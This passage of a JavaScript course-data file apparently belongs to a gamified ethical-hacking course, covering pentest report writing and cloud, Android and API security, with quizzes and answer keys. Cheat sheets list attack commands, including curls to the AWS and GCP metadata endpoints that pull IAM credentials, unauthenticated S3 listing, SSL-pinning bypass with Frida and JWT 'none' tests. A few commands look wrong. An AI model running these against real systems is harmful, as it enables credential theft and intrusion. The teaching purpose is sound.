          {q:"Business logic flaws often have?",a:["Low payouts","Highest payouts (unique to the app)","Medium payouts only","No payouts"],c:1},
          {q:"Responsible disclosure means?",a:["Sell vulns to highest bidder","Report privately, give fix time, don't publicize early","Ignore the bug","Report on Twitter immediately"],c:1},
        ]
      },
      { id:"m14l2", title:"Professional Penetration Test Report Writing", xp:110,
        content:[
          {t:"h", v:"// PENTEST REPORTING: YOUR FINDINGS = YOUR PAYCHECK"},
          {t:"p", v:"A pentest is only as valuable as its report. Technical clients need detailed PoC. Business clients need executive summaries. You must write BOTH."},
          {t:"code", v:"# ── PENTEST REPORT STRUCTURE ─────────────────────────\n# 1. Cover Page\n#    - Client name, date, classification, author\n\n# 2. Executive Summary (for management, non-technical)\n#    - Overall security posture\n#    - Number of findings by severity\n#    - Top 3 most critical issues\n#    - Key recommendations\n\n# 3. Scope & Methodology\n#    - IPs/domains tested\n#    - Testing period\n#    - Tools and techniques used\n#    - Testing limitations\n\n# 4. Findings (for technical team)\n#    Each finding must have:\n#    - Title & CVE if applicable\n#    - Severity (Critical/High/Medium/Low/Info)\n#    - CVSS Score\n#    - Affected asset\n#    - Description\n#    - Step-by-step reproduction\n#    - Evidence (screenshots, Burp requests)\n#    - Impact (what an attacker can do)\n#    - Remediation (specific, actionable)\n\n# 5. Appendix\n#    - Tool outputs, scan results"},
          {t:"code", v:"# ── FINDING SEVERITY RATINGS ─────────────────────────\nCritical — Direct system compromise, data breach\n           (SQLi with DB dump, RCE, auth bypass → admin)\nHigh     — Significant risk, exploitation likely\n           (Stored XSS, unauth admin access, privesc)\nMedium   — Moderate risk, exploitation possible\n           (CSRF, reflected XSS, sensitive info disclosure)\nLow      — Minor risk, defense-in-depth\n           (Missing headers, verbose errors, outdated TLS)\nInfo     — Best practice, no direct risk\n\n# ── REMEDIATION EXAMPLES ─────────────────────────────\n# SQLi: Use parameterized queries / prepared statements\n# XSS:  Implement output encoding + CSP headers\n# Auth: Implement MFA + strong session management\n# IDOR: Validate object-level authorization server-side"},
          {t:"tip", v:"Use Dradis Community, Serpico, or Obsidian to organize findings during testing. Screenshots + timestamps + request/response = bulletproof evidence."},
        ],
        quiz:[
          {q:"Executive summary is written for?",a:["Technical team","Management/non-technical stakeholders","Developers only","Auditors only"],c:1},
          {q:"CVSS score of 9.0-10.0 is?",a:["Low","Medium","High","Critical"],c:3},
          {q:"PoC (Proof of Concept) in a finding means?",a:["Policy of Contract","Proof of Concept — reproducible demonstration","Part of Code","Plan of Change"],c:1},
          {q:"SQL injection remediation is?",a:["WAF only","Input validation only","Parameterized queries/prepared statements","Encoding only"],c:2},
          {q:"Dradis is used for?",a:["Port scanning","Pentest report/finding organization","Hash cracking","Web fuzzing"],c:1},
        ]
      },
    ],
    test:[
      {q:"HackerOne is a?",a:["Vulnerability scanner","Bug bounty platform","Exploit framework","CTF platform"],c:1},
      {q:"Critical P1 bug bounty can pay?",a:["$0-50","$500-5000","$10K-$1M+","$50-500"],c:2},
      {q:"Executive summary targets?",a:["Technical team","Non-technical management","Developers","Security engineers"],c:1},
      {q:"CVSS stands for?",a:["Common Vulnerability Scoring System","Cyber Vulnerability Scale Score","Critical Vuln Security System","Certified Vuln Scan Score"],c:0},
      {q:"Parameterized queries fix?",a:["XSS","SQL injection","CSRF","Buffer overflow"],c:1},
      {q:"First step in any bug bounty program?",a:["Scan immediately","Read scope/policy completely","Create report template","Check payouts"],c:1},
      {q:"Responsible disclosure timeline typically?",a:["24 hours","7 days","90 days (industry standard)","1 year"],c:2},
    ]
  },

  /* ══════════════════════════════════════════════════════════
   * MODULE 15 — CLOUD, MOBILE & API SECURITY
   * ══════════════════════════════════════════════════════════ */
  {
    id:"m15", title:"Cloud, Mobile & API Security", emoji:"☁️",
    color:"#16a085", xp:1000, desc:"AWS/Azure attacks, Android hacking & API security testing",
    lessons:[
      { id:"m15l1", title:"Cloud Security & AWS Attacks", xp:120,
        content:[
          {t:"h", v:"// CLOUD SECURITY: THE NEW ATTACK FRONTIER"},
          {t:"p", v:"80% of organizations now use cloud services. Misconfigured cloud = MASSIVE data exposure. AWS, Azure, GCP all have common misconfigurations that lead to breaches."},
          {t:"code", v:"# ── AWS COMMON VULNERABILITIES ───────────────────────\n# 1. Open S3 Buckets — public data exposure!\naws s3 ls s3://target-bucket --no-sign-request\nawsbucketdump -n target\ns3scanner --bucket target-bucket\n\n# 2. Exposed AWS Keys (git repos, files):\ngrep -r 'AKIA' .    # AWS access key format\ntrufflehog git https://github.com/target/repo\n# Test keys:\naws sts get-caller-identity  # Who am I?\n\n# 3. IMDSv1 → SSRF → AWS Metadata:\n# Via SSRF in web app:\ncurl http://169.254.169.254/latest/meta-data/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n# → Get temporary AWS keys from metadata!\n\n# ── AWS ENUMERATION (ScoutSuite, Prowler) ─────────────\nscoutsuite aws                    # Multi-cloud security audit\nprowler -g group1                 # AWS CIS benchmark check\npacu                              # AWS exploitation framework"},
          {t:"code", v:"# ── AZURE ATTACKS ────────────────────────────────────\n# Azure AD enumeration:\naaz-dev aadinternals\nInvoke-AADIntReconAsOutsider -DomainName target.com\n\n# Find Azure subdomains:\n# target.blob.core.windows.net    (storage)\n# target.azurewebsites.net        (app service)\n# target.onmicrosoft.com          (Azure AD)\n\n# ── GCP ATTACKS ───────────────────────────────────────\n# Metadata endpoint:\ncurl http://metadata.google.internal/computeMetadata/v1/ \\\n  -H 'Metadata-Flavor: Google'\n# Check public GCS buckets:\ngcloud storage ls --project TARGET\ngsutil ls gs://target-bucket"},
        ],
        quiz:[
          {q:"AWS S3 open bucket means?",a:["S3 is running","Publicly accessible storage — data exposed!","S3 is encrypted","S3 is empty"],c:1},
          {q:"AWS metadata endpoint (SSRF target) is?",a:["10.0.0.1","169.254.169.254","127.0.0.1","192.168.1.1"],c:1},
          {q:"Pacu is an AWS?",a:["Defense tool","Exploitation framework","Scanning tool","Logging service"],c:1},
          {q:"TruffleHog finds?",a:["Open ports","Hardcoded secrets/keys in git repos","SQL injection","Malware"],c:1},
          {q:"IMDSv2 vs IMDSv1 key difference?",a:["IMDSv2 is slower","IMDSv2 requires session token (prevents SSRF)","IMDSv2 has more data","IMDSv2 is public"],c:1},
        ]
      },
      { id:"m15l2", title:"Mobile App Security — Android Hacking", xp:110,
        content:[
          {t:"h", v:"// ANDROID HACKING: ATTACK IN YOUR POCKET"},
          {t:"p", v:"Billions of Android devices. Bangladesh has 170M+ mobile users. Mobile app vulnerabilities expose user data, banking credentials, and private communications."},
          {t:"code", v:"# ── ANDROID SETUP ────────────────────────────────────\n# Android Debug Bridge (ADB):\nadb devices                       # Connected devices\nadb shell                         # Shell on device\nadb install app.apk               # Install APK\nadb pull /sdcard/file .           # Download from device\n\n# ── APK ANALYSIS ──────────────────────────────────────\n# Decompile APK:\napktool d app.apk -o output/      # Decode resources\njavap -c classes.dex              # Decompile bytecode\nJadx-GUI app.apk                  # Decompile to Java (BEST!)\n\n# Search for secrets in decompiled code:\ngrep -r 'api_key\\|password\\|secret\\|token' output/\ngrep -r 'http://' output/         # Hardcoded endpoints!\ngrep -r 'SQLiteDatabase' output/  # Local DB usage\n\n# ── DYNAMIC ANALYSIS ──────────────────────────────────\n# Intercept Android traffic with Burp:\n# 1. Install Burp CA cert on Android\n# 2. Set Burp proxy on device WiFi settings\n# 3. Traffic flows through Burp!\n\n# SSL Pinning bypass (with Frida):\nfrida-ps -U                       # List processes\nfrida -U -n 'AppName' -l ssl-bypass.js  # Bypass pinning\n# Script: https://github.com/httptoolkit/frida-android-unpinning"},
          {t:"code", v:"# ── MOBILE OWASP TOP 10 ──────────────────────────────\n# M1: Improper Platform Usage (over-privileged apps)\n# M2: Insecure Data Storage (SQLite/logs with creds!)\n# M3: Insecure Communication (HTTP, no cert validation)\n# M4: Insecure Authentication (no lockout, weak tokens)\n# M5: Insufficient Cryptography (MD5, hardcoded keys)\n# M6: Insecure Authorization (IDOR in APIs)\n# M7: Client Code Quality (buffer overflow in native)\n# M8: Code Tampering (no root detection)\n# M9: Reverse Engineering (no obfuscation)\n# M10: Extraneous Functionality (debug features in prod)"},
        ],
        quiz:[
          {q:"ADB stands for?",a:["Android Debug Bridge","App Database Backend","Android Disk Backup","App Debug Build"],c:0},
          {q:"Jadx-GUI is used for?",a:["ADB connection","Decompiling APK to readable Java","Brute forcing apps","SSL testing"],c:1},
          {q:"SSL Pinning prevents?",a:["App installation","MitM traffic interception via Burp","Root detection","Code decompilation"],c:1},
          {q:"Frida is a?",a:["Android vulnerability","Dynamic instrumentation toolkit","Static analysis tool","Database"],c:1},
          {q:"M2 Mobile OWASP (Insecure Storage) includes?",a:["Network issues","Sensitive data in SQLite/logs/SharedPrefs","Authentication bypass","Code quality"],c:1},
        ]
      },
      { id:"m15l3", title:"API Security Testing", xp:100,
        content:[
          {t:"h", v:"// API SECURITY: THE HIDDEN ATTACK SURFACE"},
          {t:"p", v:"Modern apps are API-first. Every mobile app, web app, and IoT device uses APIs. APIs expose the SAME vulnerabilities as web apps — often with less protection."},
          {t:"code", v:"# ── API RECONNAISSANCE ────────────────────────────────\n# Find API endpoints:\nkiterunner scan https://target.com -w routes-large.kite\ngobuster dir -u https://target.com/api -w api-endpoints.txt\nffuf -u https://target.com/api/FUZZ -w wordlist.txt\n\n# API documentation (often publicly accessible!):\nhttps://target.com/api/docs\nhttps://target.com/swagger.json\nhttps://target.com/openapi.yaml\nhttps://target.com/api/v1  (version enumeration)\n\n# ── OWASP API TOP 10 ─────────────────────────────────\n# API1: Broken Object Level Authorization (IDOR!)\n# → GET /api/users/123 → change to /api/users/124\n# API2: Broken Authentication\n# API3: Excessive Data Exposure\n# → API returns full user object, frontend hides fields\n# API4: Lack of Resources & Rate Limiting\n# → Brute force, DDoS\n# API5: Function Level Authorization\n# → Regular user calling /api/admin/deleteUser\n# API6: Mass Assignment\n# → POST /users with 'role': 'admin' in body!\n\n# ── JWT TESTING ───────────────────────────────────────\n# Decode JWT (base64 is not encryption!):\necho 'JWT_PAYLOAD' | base64 -d\n# Test none algorithm:\npython3 -c \"\nimport json, base64\nheader = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode()\n\""},
        ],
        quiz:[
          {q:"IDOR in APIs means?",a:["Invalid Data Object Reference","Insecure Direct Object Reference — access other users data","Internal Data Object","Indirect Data Request"],c:1},
          {q:"Swagger/OpenAPI docs are useful for?",a:["Nothing","Finding all API endpoints and parameters","Password cracking","Port scanning"],c:1},
          {q:"Mass Assignment attack sends?",a:["Malware in request","Unexpected fields like 'role:admin' in request body","SQL in request","JavaScript in request"],c:1},
          {q:"API rate limiting prevents?",a:["SQL injection","Brute force and DDoS attacks","XSS","Code injection"],c:1},
          {q:"JWT payload is encoded with?",a:["AES encryption","RSA encryption","Base64 (NOT encryption — just encoding)","MD5"],c:2},
        ]
      },
    ],
    test:[
      {q:"AWS metadata SSRF endpoint?",a:["10.0.0.1","169.254.169.254","127.0.0.1","192.168.0.1"],c:1},
      {q:"Open S3 bucket means?",a:["S3 is running","Public accessible storage — data exposed","S3 encrypted","S3 empty"],c:1},
      {q:"ADB is used for?",a:["Cloud attacks","Android device control and debugging","API testing","AWS attacks"],c:1},
      {q:"Jadx-GUI decompiles?",a:["JavaScript","APK to Java source","Python","Bash"],c:1},
      {q:"IDOR in API = ?",a:["Injected Data Object","Insecure Direct Object Reference","Invalid Data","Input Data Override"],c:1},
      {q:"Frida is used for?",a:["Network scanning","Dynamic app instrumentation (bypass SSL pinning)","Static analysis","Port forwarding"],c:1},
      {q:"Swagger docs reveal?",a:["Server passwords","All API endpoints and parameters","Network topology","Database schema only"],c:1},
    ]
  },
]; // END MODULES
